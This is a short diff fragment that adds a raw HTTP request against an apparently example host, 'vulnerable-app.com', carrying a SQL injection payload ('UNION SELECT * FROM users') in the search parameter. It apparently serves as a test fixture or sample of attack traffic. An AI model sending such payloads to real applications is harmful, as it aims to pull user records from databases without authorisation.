@@ -1,0 +1,3 @@
+GET /search?q=UNION SELECT * FROM users HTTP/1.1
+Host: vulnerable-app.com
+
